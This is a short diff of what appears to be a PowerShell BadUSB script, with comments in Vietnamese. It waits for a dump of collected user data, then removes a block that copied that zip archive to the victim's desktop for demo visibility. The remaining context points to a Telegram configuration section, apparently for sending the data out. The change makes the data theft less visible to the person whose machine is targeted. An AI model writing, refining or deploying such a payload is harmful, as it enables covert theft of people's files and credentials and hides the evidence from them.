@@ -43,12 +43,7 @@ while (!(Test-Path "$dumpFile")) {
     Start-Sleep -Seconds 1
 }
 
-# ===============================================================================
-# [THÊM MỚI] LƯU LẠI BẢN SAO RA MÀN HÌNH DESKTOP ĐỂ DEMO DỄ NHÌN
-# ===============================================================================
-$desktopPath = "$env:USERPROFILE\Desktop\DuLieu_BadUSB_$env:USERNAME.zip"
-Copy-Item -Path $dumpFile -Destination $desktopPath -Force
-# ===============================================================================
+
 
 
 # Telegram configuration
